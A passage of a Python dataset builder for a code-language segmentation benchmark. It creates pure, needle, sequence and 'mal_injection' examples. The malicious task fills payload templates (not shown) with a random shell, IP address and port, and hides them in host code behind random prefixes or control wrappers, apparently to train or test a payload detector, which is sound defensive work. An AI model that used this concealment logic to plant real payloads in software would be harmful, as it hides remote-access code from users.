        _, _, window_start, window_end, host_ratio = sliced
        region = _make_monitor_region(
            doc,
            window_start,
            window_end,
            anchor_label=host_lang,
            strip_first_line_indent=False,
        )
        if region is None:
            continue
        if region.anchor_ratio <= float(min_ratio):
            continue
        pools.setdefault(host_lang, []).append(
            MonitorRegion(
                anchor_label=region.anchor_label,
                content=region.content,
                segments=region.segments,
                source_uid=region.source_uid,
                source_declared_lang=region.source_declared_lang,
                source_char_start=region.source_char_start,
                source_char_end=region.source_char_end,
                anchor_ratio=float(host_ratio),
                visible_chars=region.visible_chars,
                source_labels=region.source_labels,
                monitor_source=region.monitor_source,
            )
        )
    return pools


def _make_record(
    task: str,
    lang: str,
    index: int,
    content: str,
    segments: List[dict],
    source_langs: Sequence[str],
    metadata: dict,
) -> dict:
    content = _normalize_text(content)
    example_id = _hash_example_id(task, lang, index, salt=str(metadata.get("seed", "")))
    uniq_langs = sorted({lbl for lbl in source_langs if isinstance(lbl, str) and lbl})

    # HuggingFace encodes SeqFeature(struct) columns as a dict-of-lists, so
    # convert from our internal list-of-dicts representation.
    if isinstance(segments, dict):
        seg_value: Any = segments
    else:
        labels: List[str] = []
        starts: List[int] = []
        ends: List[int] = []
        for seg in segments:
            if not isinstance(seg, dict):
                continue
            labels.append(str(seg.get("label", "")))
            try:
                starts.append(int(seg.get("char_start", 0)))
                ends.append(int(seg.get("char_end", 0)))
            except (TypeError, ValueError):
                starts.append(0)
                ends.append(0)
        seg_value = {
            "label": labels,
            "char_start": starts,
            "char_end": ends,
        }

    return {
        "task": task,
        "example_id": example_id,
        "content": content,
        "segments": seg_value,
        "source_langs": uniq_langs,
        "metadata_json": json.dumps(metadata, sort_keys=True),
    }


def _classify_comment_lines(lines: Sequence[str]) -> List[bool]:
    """Return heuristic comment flags for each line."""
    flags: List[bool] = []
    inside_c_block = False
    inside_doc_block: Optional[str] = None
    inside_html_comment = False
    for line in lines:
        stripped = line.strip()
        lower = stripped.lower()
        is_comment = False

        if inside_doc_block:
            is_comment = True
            if inside_doc_block in stripped:
                occurrences = stripped.count(inside_doc_block)
                if occurrences % 2 == 1:
                    inside_doc_block = None
        elif inside_html_comment:
            is_comment = True
            if "-->" in line:
                inside_html_comment = False
        elif inside_c_block:
            is_comment = True
            if "*/" in line:
                inside_c_block = False
        else:
            if stripped.startswith("//") or stripped.startswith("#") or stripped.startswith("--") or stripped.startswith("%"):
                is_comment = True
            elif lower.startswith("rem "):
                is_comment = True
            elif stripped.startswith("<!--"):
                is_comment = True
                if "-->" not in stripped:
                    inside_html_comment = True
            elif stripped.startswith("*/"):
                is_comment = True
            elif stripped.startswith("/*"):
                is_comment = True
                if "*/" not in stripped or stripped.find("*/") < stripped.find("/*"):
                    inside_c_block = True
            else:
                comment_pos = stripped.find("/*")
                if comment_pos != -1:
                    if "*/" not in stripped[comment_pos + 2:]:
                        inside_c_block = True
                    if stripped[:comment_pos].strip() == "":
                        is_comment = True
            if stripped.startswith('"""') or stripped.startswith("'''"):
                is_comment = True
                delim = stripped[:3]
                quote_count = stripped.count(delim)
                if quote_count % 2 == 1:
                    inside_doc_block = delim

        flags.append(is_comment)
    return flags


def _select_line_block(
    text: str,
    min_bytes: int,
    max_bytes: Optional[int],
    rng: random.Random,
) -> Optional[dict]:
    """Select a contiguous set of whole lines that fit the byte window."""
    if not text:
        return None
    lines = text.splitlines(keepends=True)
    if not lines:
        return None
    flags = _classify_comment_lines(lines)
    letter_lengths = [_ascii_letter_count(line) for line in lines]

    candidates: List[dict] = []
    total_lines = len(lines)
    for start in range(total_lines):
        if not lines[start].lstrip(" \t").strip():
            continue
        total_letters = 0
        comment_lines = 0
        snippet_lines: List[str] = []
        for end in range(start, total_lines):
            snippet_lines.append(lines[end])
            total_letters += letter_lengths[end]
            if flags[end]:
                comment_lines += 1

            if total_letters < min_bytes:
                continue
            if max_bytes is not None and total_letters > max_bytes:
                break

            non_comment_count = len(snippet_lines) - comment_lines
            if non_comment_count <= 0:
                continue
            comment_ratio = comment_lines / len(snippet_lines)
            if comment_ratio > _MAX_NEEDLE_COMMENT_RATIO:
                continue

            snippet_text = "".join([snippet_lines[0].lstrip(" \t"), *snippet_lines[1:]])
            if not snippet_text.strip():
                continue

            candidates.append(
                {
                    "start_line": start,
                    "end_line": end + 1,
                    "text": snippet_text,
                    "visible_chars": total_letters,
                    "letter_chars": total_letters,
                    "comment_ratio": comment_ratio,
                    "comment_lines": comment_lines,
                    "total_lines": len(snippet_lines),
                }
            )

    if not candidates:
        return None

    min_ratio = min(candidate["comment_ratio"] for candidate in candidates)
    relaxed = [c for c in candidates if c["comment_ratio"] <= min_ratio + 0.1]
    chosen = rng.choice(relaxed if relaxed else candidates)
    return chosen


def _random_shell(rng: random.Random) -> str:
    return rng.choice(_PAYLOAD_SHELL_CHOICES)


def _random_ip(rng: random.Random) -> str:
    return ".".join(str(rng.randint(11, 223)) for _ in range(4))


def _random_port(rng: random.Random) -> int:
    return rng.randint(1024, 65535)


def _truncate_payload(snippet: str) -> str:
    if _visible_char_count(snippet) <= _PAYLOAD_MAX_VISIBLE:
        return _normalize_text(snippet)

    import re

    tokens = list(re.finditer(r"\S+", snippet, re.MULTILINE))
    if not tokens:
        data = snippet.encode("utf-8", "ignore")
        cut = data[: _PAYLOAD_MAX_VISIBLE].decode("utf-8", "ignore")
        return _normalize_text(cut)

    best = None
    best_visible = 0

    for start_idx, start_match in enumerate(tokens):
        start = start_match.start()
        for end_idx in range(start_idx, len(tokens)):
            end = tokens[end_idx].end()
            candidate = snippet[start:end]
            visible = _visible_char_count(candidate)
            if visible <= _PAYLOAD_MAX_VISIBLE and visible > best_visible:
                best = (start, end_idx)
                best_visible = visible
            if visible > _PAYLOAD_MAX_VISIBLE:
                break

    if best is None:
        data = snippet.encode("utf-8", "ignore")
        cut = data[: _PAYLOAD_MAX_VISIBLE].decode("utf-8", "ignore")
        return _normalize_text(cut)

    start, end_token_idx = best
    end = tokens[end_token_idx].end()
    trailing = snippet[end:]
    for offset, ch in enumerate(trailing):
        if not ch.isspace():
            break
        candidate = snippet[start : end + offset + 1]
        if _visible_char_count(candidate) <= _PAYLOAD_MAX_VISIBLE:
            end = end + offset + 1
        else:
            break

    truncated = snippet[start:end]
    return _normalize_text(truncated)


def _generate_payload_snippet(payload_lang: str, rng: random.Random) -> Optional[str]:
    options = malicious_injections_to_discover.get(payload_lang)
    if not options:
        return None
    template = rng.choice(options)
    shell = _random_shell(rng)
    ip = _random_ip(rng)
    port = _random_port(rng)
    snippet = template.replace("{shell}", shell).replace("{ip}", ip).replace("{port}", str(port))
    snippet = _truncate_payload(snippet.strip("\n"))
    return snippet if snippet else None


def _choose_insertion_style(rng: random.Random) -> str:
    roll = rng.random()
    if roll < 0.25:
        return "raw_random"
    if roll < 0.75:
        return "line_or_tab_prefixed"
    return "control_wrapped"


def _inject_snippet_text(
    host_text: str,
    snippet: str,
    rng: random.Random,
) -> SnippetInsertion:
    insert_at = rng.randrange(0, len(host_text) + 1)
    style = _choose_insertion_style(rng)
    context_prefix = ""
    context_suffix = ""
    if style == "line_or_tab_prefixed":
        context_prefix = rng.choice(_PAYLOAD_LINE_PREFIX_CHOICES)
    elif style == "control_wrapped":
        context_prefix, context_suffix = rng.choice(_PAYLOAD_CONTROL_WRAPPERS)

    snippet_char_start = insert_at + len(context_prefix)
    snippet_char_end = snippet_char_start + len(snippet)
    content = (
        host_text[:insert_at]
        + context_prefix
        + snippet
        + context_suffix
        + host_text[insert_at:]
    )
    return SnippetInsertion(
        content=content,
        insertion_char=insert_at,
        snippet_char_start=snippet_char_start,
        snippet_char_end=snippet_char_end,
        context_prefix=context_prefix,
        context_suffix=context_suffix,
        injection_style=style,
    )


def _merge_adjacent_segments(segments: Sequence[dict]) -> List[dict]:
    merged: List[dict] = []
    for seg in segments:
        label = str(seg.get("label", ""))
        try:
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
        except (TypeError, ValueError):
            continue
        if end <= start:
            continue
        if merged and merged[-1]["label"] == label and int(merged[-1]["char_end"]) == start:
            merged[-1]["char_end"] = end
        else:
            merged.append(_segment(label, start, end))
    return merged


def _context_label_at_insertion(
    base_segments: Sequence[dict],
    insert_at: int,
    default_label: str,
) -> str:
    before_label: Optional[str] = None
    after_label: Optional[str] = None
    for seg in base_segments:
        label = str(seg.get("label", "")) or default_label
        try:
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
        except (TypeError, ValueError):
            continue
        if end <= start:
            continue
        if start < insert_at < end:
            return label
        if end == insert_at:
            before_label = label
        elif start == insert_at and after_label is None:
            after_label = label
    return before_label or after_label or default_label


def _insert_segments_at_offset(
    base_segments: Sequence[dict],
    insert_at: int,
    inserted_parts: Sequence[Tuple[str, str]],
) -> List[dict]:
    inserted_segments: List[dict] = []
    cursor = int(insert_at)
    total_insert_len = 0
    for label, text in inserted_parts:
        if not text:
            continue
        next_cursor = cursor + len(text)
        inserted_segments.append(_segment(label, cursor, next_cursor))
        cursor = next_cursor
        total_insert_len += len(text)

    new_segments: List[dict] = []
    inserted = False

    def _add_inserted_segments() -> None:
        nonlocal inserted
        if inserted:
            return
        new_segments.extend(inserted_segments)
        inserted = True

    for seg in base_segments:
        label = str(seg.get("label", ""))
        try:
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
        except (TypeError, ValueError):
            continue
        if end <= start:
            continue

        if end <= insert_at:
            new_segments.append(_segment(label, start, end))
            continue

        if start >= insert_at:
            _add_inserted_segments()
            new_segments.append(_segment(label, start + total_insert_len, end + total_insert_len))
            continue

        new_segments.append(_segment(label, start, insert_at))
        _add_inserted_segments()
        right_start = insert_at + total_insert_len
        right_end = end + total_insert_len
        if right_start < right_end:
            new_segments.append(_segment(label, right_start, right_end))

    if not inserted:
        _add_inserted_segments()

    return _merge_adjacent_segments(new_segments)


def _insert_segment_list_at_offset(
    base_segments: Sequence[dict],
    insert_at: int,
    inserted_segments: Sequence[dict],
) -> List[dict]:
    shifted_inserted: List[dict] = []
    max_end = int(insert_at)
    for seg in inserted_segments:
        label = str(seg.get("label", ""))
        try:
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
        except (TypeError, ValueError):
            continue
        if end <= start:
            continue
        shifted_start = int(insert_at) + start
        shifted_end = int(insert_at) + end
        shifted_inserted.append(_segment(label, shifted_start, shifted_end))
        max_end = max(max_end, shifted_end)

    total_insert_len = max(0, max_end - int(insert_at))
    new_segments: List[dict] = []
    inserted = False

    def _add_inserted_segments() -> None:
        nonlocal inserted
        if inserted:
            return
        new_segments.extend(shifted_inserted)
        inserted = True

    for seg in base_segments:
        label = str(seg.get("label", ""))
        try:
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
        except (TypeError, ValueError):
            continue
        if end <= start:
            continue

        if end <= insert_at:
            new_segments.append(_segment(label, start, end))
            continue

        if start >= insert_at:
            _add_inserted_segments()
            new_segments.append(_segment(label, start + total_insert_len, end + total_insert_len))
            continue

        new_segments.append(_segment(label, start, insert_at))
        _add_inserted_segments()
        right_start = insert_at + total_insert_len
        right_end = end + total_insert_len
        if right_start < right_end:
            new_segments.append(_segment(label, right_start, right_end))

    if not inserted:
        _add_inserted_segments()

    return _merge_adjacent_segments(new_segments)


def _build_pure_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
) -> Tuple[str, List[dict], str]:
    task = "pure_fragments"
    examples: List[dict] = []
    desc = "Single-label monitor fragments (baseline accuracy)."
    for lang, frags in fragments_by_lang.items():
        limit = min(per_label, len(frags))
        for idx in range(limit):
            frag = frags[idx]
            content = frag.content
            segments = [_segment(lang, 0, len(content))]
            meta = {
                "host_lang": lang,
                "host_uid": frag.uid,
                "source_meta": frag.extra_meta,
            }
            record = _make_record(task, lang, idx, content, segments, [lang], meta)
            examples.append(record)
    return task, examples, desc


def _build_pure_dataset_from_monitor(
    monitor_docs: Sequence[MonitorDoc],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    """
    Build pure_fragments-style task from balanced monitor windows.

    Each example is a capped window from a single monitor document whose
    declared host label occupies >95% of the presented chars. We retain the
    original multi-label segmentations clipped to that window. Keeping a fixed
    budget reduces support skew from a few very long files.
    """
    task = "pure_fragments"
    desc = "Balanced monitor windows with >95% host-labeled chars and original segmentations."
    examples: List[dict] = []

    if not monitor_docs:
        _log("⚠️  No monitor documents available; skipping pure_fragments.")
        return task, examples, desc

    docs_by_lang: Dict[str, List[MonitorDoc]] = {}
    for doc in monitor_docs:
        lang = doc.declared_lang or "unknown"
        docs_by_lang.setdefault(lang, []).append(doc)

    for lang, docs in docs_by_lang.items():
        if not docs:
            continue
        rng.shuffle(docs)
        limit = min(per_label, len(docs))
        for idx, doc in enumerate(docs[:limit]):
            if not doc.segments or not doc.content:
                continue

            sliced = _slice_monitor_doc_window_with_min_label_ratio(
                doc,
                rng,
                max_chars=int(cfg.MODEL_WINDOW_BYTES),
                prefer_label=lang,
                min_ratio=_PURE_FRAGMENT_HOST_MIN_RATIO,
            )
            if sliced is None:
                continue
            content, segments, window_start, window_end, host_label_ratio = sliced
            if not segments:
                continue

            langs = sorted({seg["label"] for seg in segments if seg.get("label")})
            meta = {
                "host_lang": lang,
                "host_uid": doc.uid,
                "host_label_ratio": float(host_label_ratio),
                "monitor_source": doc.source,
                "window_char_start": int(window_start),
                "window_char_end": int(window_end),
                "source_char_len": len(doc.content),
            }
            if doc.extra_meta:
                meta.update(doc.extra_meta)
            record = _make_record(task, lang, idx, content, segments, langs, meta)
            examples.append(record)

    return task, examples, desc


def _choose_injection(
    fragments_by_lang: Dict[str, List[Fragment]],
    host_lang: str,
    rng: random.Random,
    min_bytes: int,
    max_bytes: Optional[int],
    *,
    donor_counts: Optional[Mapping[str, int]] = None,
    pair_counts: Optional[Mapping[Tuple[str, str], int]] = None,
) -> Optional[Tuple[str, Fragment, dict]]:
    donor_langs = [
        lang
        for lang in fragments_by_lang.keys()
        if lang != host_lang
        and fragments_by_lang[lang]
        and lang.lower() not in _PROHIBITED_INJECTION_LANGS
    ]
    if not donor_langs:
        return None

    ordered_langs = list(donor_langs)
    rng.shuffle(ordered_langs)
    ordered_langs.sort(
        key=lambda lang: (
            int((donor_counts or {}).get(lang, 0)),
            int((pair_counts or {}).get((host_lang, lang), 0)),
            lang,
        )
    )

    for d_lang in ordered_langs:
        donor_pool = list(fragments_by_lang[d_lang])
        rng.shuffle(donor_pool)
        probe_limit = min(len(donor_pool), 24)
        for donor in donor_pool[:probe_limit]:
            snippet_info = _select_line_block(donor.content, min_bytes, max_bytes, rng)
            if snippet_info:
                return d_lang, donor, snippet_info

    for _ in range(100):
        d_lang = rng.choice(ordered_langs)
        donor = rng.choice(fragments_by_lang[d_lang])
        snippet_info = _select_line_block(donor.content, min_bytes, max_bytes, rng)
        if snippet_info:
            return d_lang, donor, snippet_info
    return None


def _build_injection_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
    bucket_name: str,
    min_bytes: int,
    max_bytes: Optional[int],
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    task = f"needle_{bucket_name}"
    desc = (
        "Balanced host fragments with a foreign-language needle injection sized "
        f"{min_bytes}-{'∞' if max_bytes is None else max_bytes} printable chars (whitespace ignored)."
    )
    examples: List[dict] = []
    _log(f"💉 Building injection dataset for size {min_bytes}-{'∞' if max_bytes is None else max_bytes} bytes...")
    donor_counts: Counter[str] = Counter()
    pair_counts: Counter[Tuple[str, str]] = Counter()

    for lang, frags in fragments_by_lang.items():
        if not frags:
            continue
        limit = min(per_label, len(frags))
        if limit == 0:
            continue
        for idx in range(limit):
            host = frags[idx]
            inj = _choose_injection(
                fragments_by_lang,
                lang,
                rng,
                min_bytes,
                max_bytes,
                donor_counts=donor_counts,
                pair_counts=pair_counts,
            )
            if not inj:
                continue
            donor_lang, donor_frag, snippet_info = inj
            if donor_lang == lang:
                continue
            snippet = snippet_info.get("text")
            if not snippet:
                continue
            host_text = _trim_text_to_budget(host.content, int(cfg.MODEL_WINDOW_BYTES), rng=rng)
            if not host_text:
                continue
            insertion = _inject_snippet_text(host_text, snippet, rng)
            inserted_parts: List[Tuple[str, str]] = []
            if insertion.context_prefix:
                inserted_parts.append((lang, insertion.context_prefix))
            inserted_parts.append((donor_lang, snippet))
            if insertion.context_suffix:
                inserted_parts.append((lang, insertion.context_suffix))
            content = insertion.content
            segments = _insert_segments_at_offset(
                [_segment(lang, 0, len(host_text))],
                insertion.insertion_char,
                inserted_parts,
            )
            langs = sorted({seg["label"] for seg in segments if seg.get("label")})
            inj_letters = _ascii_letter_count(snippet)
            inj_raw_bytes = len(snippet.encode("utf-8", "ignore"))
            meta = {
                "host_lang": lang,
                "host_uid": host.uid,
                "donor_lang": donor_lang,
                "donor_uid": donor_frag.uid,
                "insertion_char": insertion.insertion_char,
                "needle_char_start": insertion.snippet_char_start,
                "needle_char_end": insertion.snippet_char_end,
                "context_prefix": insertion.context_prefix,
                "context_suffix": insertion.context_suffix,
                "injection_style": insertion.injection_style,
                "injection_visible_chars": inj_letters,
                "injection_letter_chars": inj_letters,
                "injection_bytes": inj_raw_bytes,
                "injection_lines": snippet_info.get("total_lines"),
                "injection_comment_lines": snippet_info.get("comment_lines"),
                "injection_comment_ratio": snippet_info.get("comment_ratio"),
                "donor_start_line": snippet_info.get("start_line"),
                "donor_end_line": snippet_info.get("end_line"),
                "size_bucket": bucket_name,
            }
            record = _make_record(task, lang, idx, content, segments, langs, meta)
            examples.append(record)
            donor_counts[donor_lang] += 1
            pair_counts[(lang, donor_lang)] += 1

    return task, examples, desc


def _build_monitor_needle_dataset(
    monitor_docs: Sequence[MonitorDoc],
    per_label: int,
    bucket_name: str,
    min_bytes: int,
    max_bytes: Optional[int],
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    """Build needle-in-the-haystack datasets from natural monitor segments.

    Instead of synthetic injections, this groups real short foreign-language
    segments from the monitor set into size buckets.
    """
    task = f"needle_{bucket_name}"
    desc = (
        "Natural monitor files with a short foreign-language needle sized "
        f"{min_bytes}-{'∞' if max_bytes is None else max_bytes} printable chars (whitespace ignored)."
    )
    examples: List[dict] = []
    _log(
        f"💉 Building monitor needle dataset for size {min_bytes}-"
        f"{'∞' if max_bytes is None else max_bytes} bytes..."
    )

    # Collect candidate (host_lang -> [ (MonitorDoc, donor_label) ])
    candidates: Dict[str, List[Tuple[MonitorDoc, str]]] = {}
    for doc in monitor_docs:
        if not doc.segments or len(doc.segments) < 2:
            continue

        # Compute total chars per label to pick a reasonable host language.
        length_per_label: Dict[str, int] = {}
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
            if end <= start:
                continue
            length_per_label[label] = length_per_label.get(label, 0) + (end - start)
        if len(length_per_label) < 2:
            continue

        host_lang = max(length_per_label.items(), key=lambda kv: kv[1])[0]
        # For each foreign label, require exactly one contiguous segment so the
        # "needle" is well-defined.
        segments_by_label: Dict[str, List[dict]] = {}
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            segments_by_label.setdefault(label, []).append(seg)

        for donor_label, seg_list in segments_by_label.items():
            if donor_label == host_lang:
                continue
            if len(seg_list) != 1:
                # Skip documents where the donor language appears multiple times;
                # metrics would otherwise treat the union of all segments.
                continue
            seg = seg_list[0]
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
            if end <= start:
                continue
            snippet = doc.content[start:end]
            letters = _ascii_letter_count(snippet)
            if letters < min_bytes:
                continue
            if max_bytes is not None and letters > max_bytes:
                continue
            candidates.setdefault(host_lang, []).append((doc, donor_label))

    if not candidates:
        _log(f"⚠️  No natural monitor needles found for bucket {bucket_name}.")
        return task, examples, desc

    # Sample up to per_label documents per host language.
    for host_lang, host_candidates in candidates.items():
        if not host_candidates:
            continue
        rng.shuffle(host_candidates)
        limit = min(per_label, len(host_candidates))
        for idx in range(limit):
            doc, donor_label = host_candidates[idx]
            # Rebuild segments in the format expected by evaluation.
            segments = [
                _segment(str(seg.get("label", "")), int(seg.get("char_start", 0)), int(seg.get("char_end", 0)))
                for seg in doc.segments
            ]
            langs = sorted({seg["label"] for seg in segments if seg.get("label")})
            meta = {
                "host_lang": host_lang,
                "donor_lang": donor_label,
                "size_bucket": bucket_name,
                "monitor_source": doc.source,
            }
            record = _make_record(task, host_lang, idx, doc.content, segments, langs, meta)
            examples.append(record)

    return task, examples, desc


def _build_malicious_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    """Legacy synthetic malicious injection task based on pure fragments.

    Kept for backward compatibility but not used in the main pipeline anymore.
    """
    task = "mal_injection"
    desc = "Host fragments with malicious payload injections."
    examples: List[dict] = []
    payload_langs = [lang for lang, payloads in malicious_injections_to_discover.items() if payloads]
    if not payload_langs:
        return task, examples, desc

    _log("☠️  Building malicious injection dataset...")

    for host_lang, frags in fragments_by_lang.items():
        if not frags:
            continue
        available_payload_langs = [lang for lang in payload_langs if lang != host_lang]
        if not available_payload_langs:
            _log(f"⚠️  Skipping malicious payloads for '{host_lang}' — no distinct payload languages available.")
            continue
        limit = min(per_label, len(frags))
        if limit == 0:
            continue
        for idx in range(limit):
            host_frag = frags[idx]
            host_text = host_frag.content
            if not host_text:
                continue

            payload_lang = rng.choice(available_payload_langs)
            snippet = _generate_payload_snippet(payload_lang, rng)
            if not snippet:
                continue

            insertion = _inject_snippet_text(host_text, snippet, rng)
            inserted_parts: List[Tuple[str, str]] = []
            if insertion.context_prefix:
                inserted_parts.append((host_lang, insertion.context_prefix))
            inserted_parts.append((payload_lang, snippet))
            if insertion.context_suffix:
                inserted_parts.append((host_lang, insertion.context_suffix))
            content = insertion.content
            segments = _insert_segments_at_offset(
                [_segment(host_lang, 0, len(host_text))],
                insertion.insertion_char,
                inserted_parts,
            )
            langs = sorted({seg["label"] for seg in segments if seg.get("label")})
            payload_visible = _visible_char_count(snippet)
            payload_bytes = len(snippet.encode("utf-8", "ignore"))
            meta = {
                "host_lang": host_lang,
                "host_uid": host_frag.uid,
                "payload_lang": payload_lang,
                "payload_visible_chars": payload_visible,
                "payload_bytes": payload_bytes,
                "insertion_char": insertion.insertion_char,
                "payload_char_start": insertion.snippet_char_start,
                "payload_char_end": insertion.snippet_char_end,
                "context_prefix": insertion.context_prefix,
                "context_suffix": insertion.context_suffix,
                "injection_style": insertion.injection_style,
            }
            examples.append(_make_record(task, host_lang, idx, content, segments, langs, meta))

    return task, examples, desc


def _build_malicious_dataset_from_monitor(
    monitor_docs: Sequence[MonitorDoc],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    """
    Build mal_injection task from monitor (Gemini/memmap) documents.

    The host content and its labels come directly from the monitor subset
    (including any natural mixed-language segments). We then inject a synthetic
    payload snippet of `payload_lang` into the document while preserving all
    original segments and keeping any inserted wrapper/context characters
    outside the payload truth span.

    Evaluation for mal_injection then:
      - Treats all characters whose ground-truth label is `payload_lang`
        (including the injected span) as payload truth.
      - Uses IoU between the payload truth mask and predicted `payload_lang`
        / non-host predictions, so only predictions on characters whose
        ground-truth label is *not* `payload_lang` count as false positives.
    """
    task = "mal_injection"
    desc = "Balanced monitor windows with synthetic malicious payload injections."
    examples: List[dict] = []
    if not monitor_docs:
        _log("⚠️  No monitor documents available; skipping mal_injection.")
        return task, examples, desc

    payload_langs = [lang for lang, payloads in malicious_injections_to_discover.items() if payloads]
    if not payload_langs:
        return task, examples, desc

    _log("☠️  Building malicious injection dataset from monitor documents...")
    payload_counts: Counter[str] = Counter()
    host_payload_counts: Counter[Tuple[str, str]] = Counter()

    # Group monitor docs by their declared host language.
    docs_by_lang: Dict[str, List[MonitorDoc]] = {}
    for doc in monitor_docs:
        if not doc.content:
            continue
        if not doc.segments:
            continue
        host_lang = doc.declared_lang or "unknown"
        docs_by_lang.setdefault(host_lang, []).append(doc)

    for host_lang, docs in docs_by_lang.items():
        if not docs:
            continue
        # Only inject when we have a distinct payload language available.
        available_payload_langs = [lang for lang in payload_langs if lang != host_lang]
        if not available_payload_langs:
            continue

        rng.shuffle(docs)
        limit = min(per_label, len(docs))
        for idx, doc in enumerate(docs[:limit]):
            content, base_segments, window_start, window_end = _slice_monitor_doc_window(
                doc,
                rng,
                max_chars=int(cfg.MODEL_WINDOW_BYTES),
                prefer_label=host_lang,
            )
            if not content or not base_segments:
                continue

            # Choose a payload language that does not already appear in the
            # document's segmentation, so the injected span is the only region
            # with that label in the ground truth.
            existing_labels = {str(seg.get("label", "")) for seg in base_segments}
            candidate_payloads = [lang for lang in available_payload_langs if lang not in existing_labels]
            if not candidate_payloads:
                candidate_payloads = available_payload_langs

            payload_lang = _balanced_min_choice(
                candidate_payloads,
                rng,
                lambda lang: (
                    int(payload_counts.get(str(lang), 0)),
                    int(host_payload_counts.get((host_lang, str(lang)), 0)),
                    str(lang),
                ),
            )
            if payload_lang is None:
                continue
            payload_lang = str(payload_lang)
            snippet = _generate_payload_snippet(payload_lang, rng)
            if not snippet:
                continue

            insertion = _inject_snippet_text(content, snippet, rng)
            context_label = _context_label_at_insertion(
                base_segments,
                insertion.insertion_char,
                host_lang,
            )
            inserted_parts: List[Tuple[str, str]] = []
            if insertion.context_prefix:
                inserted_parts.append((context_label, insertion.context_prefix))
            inserted_parts.append((payload_lang, snippet))
            if insertion.context_suffix:
                inserted_parts.append((context_label, insertion.context_suffix))
            new_content = insertion.content
            new_segments = _insert_segments_at_offset(
                base_segments,
                insertion.insertion_char,
                inserted_parts,
            )
            langs = sorted({seg["label"] for seg in new_segments if seg.get("label")})
            payload_visible = _visible_char_count(snippet)
            payload_bytes = len(snippet.encode("utf-8", "ignore"))
            meta: Dict[str, Any] = {
                "host_lang": host_lang,
                "host_uid": doc.uid,
                "payload_lang": payload_lang,
                "payload_visible_chars": payload_visible,
                "payload_bytes": payload_bytes,
                "insertion_char": insertion.insertion_char,
                "payload_char_start": insertion.snippet_char_start,
                "payload_char_end": insertion.snippet_char_end,
                "context_prefix": insertion.context_prefix,
                "context_suffix": insertion.context_suffix,
                "injection_style": insertion.injection_style,
                "monitor_source": doc.source,
                "window_char_start": int(window_start),
                "window_char_end": int(window_end),
                "source_char_len": len(doc.content),
            }
            if doc.extra_meta:
                meta.update(doc.extra_meta)

            examples.append(
                _make_record(task, host_lang, idx, new_content, new_segments, langs, meta)
            )
            payload_counts[payload_lang] += 1
            host_payload_counts[(host_lang, payload_lang)] += 1

    return task, examples, desc


def _build_pair_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    task = "sequence_pair"
    desc = "Two-language back-to-back sequences A->B."
    examples: List[dict] = []
    _log("🔄 Building sequence pair dataset...")
    labels = [lang for lang, frags in fragments_by_lang.items() if frags]
    second_role_counts: Counter[str] = Counter()
    pair_counts: Counter[Tuple[str, str]] = Counter()
    segment_budget = max(192, int((cfg.MODEL_WINDOW_BYTES - 8) // 2))
    limits = {lang: min(per_label, len(fragments_by_lang[lang])) for lang in labels}
    max_rounds = max(limits.values(), default=0)
    for idx in range(max_rounds):
        for lang in labels:
            partners = [lbl for lbl in labels if lbl != lang]
            if not partners:
                continue
            host_list = fragments_by_lang[lang]
            limit = limits.get(lang, 0)
            if idx >= limit:
                continue
            host = host_list[idx]
            partner_lang = _balanced_min_choice(
                partners,
                rng,
                lambda label: (
                    int(second_role_counts.get(str(label), 0)),
                    int(pair_counts.get((lang, str(label)), 0)),
                    str(label),
                ),
            )
            if partner_lang is None:
                continue
            partner_lang = str(partner_lang)
            partner_frag = rng.choice(fragments_by_lang[partner_lang])
            host_text = _trim_text_to_budget(host.content.rstrip(), segment_budget, rng=rng)
            partner_text = _trim_text_to_budget(partner_frag.content.lstrip(), segment_budget, rng=rng)
            if not host_text or not partner_text:
                continue
            parts = [
                (lang, host_text + "\n\n"),
                (partner_lang, partner_text),
            ]
            content, segments, langs = _join_parts(parts)
            meta = {
                "first_lang": lang,
                "second_lang": partner_lang,
                "host_uid": host.uid,
                "partner_uid": partner_frag.uid,
            }
            examples.append(_make_record(task, lang, idx, content, segments, langs, meta))
            second_role_counts[partner_lang] += 1
            pair_counts[(lang, partner_lang)] += 1
    return task, examples, desc


def _build_triplet_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    task = "sequence_triplet"
    desc = "Three-language back-to-back sequences A->B->C."
    examples: List[dict] = []
    _log("🔄 Building sequence triplet dataset...")
    labels = [lang for lang, frags in fragments_by_lang.items() if frags]
    second_role_counts: Counter[str] = Counter()
    third_role_counts: Counter[str] = Counter()
    pair_counts: Counter[Tuple[str, str]] = Counter()
    triple_counts: Counter[Tuple[str, str, str]] = Counter()
    segment_budget = max(160, int((cfg.MODEL_WINDOW_BYTES - 12) // 3))
    limits = {lang: min(per_label, len(fragments_by_lang[lang])) for lang in labels}
    max_rounds = max(limits.values(), default=0)
    for idx in range(max_rounds):
        for lang in labels:
            others = [lbl for lbl in labels if lbl != lang]
            if len(others) < 2:
                continue
            host_list = fragments_by_lang[lang]
            limit = limits.get(lang, 0)
            if idx >= limit:
                continue
            host = host_list[idx]
            second_lang = _balanced_min_choice(
                others,
                rng,
                lambda label: (
                    int(second_role_counts.get(str(label), 0)),
                    int(pair_counts.get((lang, str(label)), 0)),
                    str(label),
                ),
            )
            if second_lang is None:
                continue
            second_lang = str(second_lang)
            third_candidates = [lbl for lbl in others if lbl != second_lang]
            third_lang = _balanced_min_choice(
                third_candidates,
                rng,
                lambda label: (
                    int(third_role_counts.get(str(label), 0)),
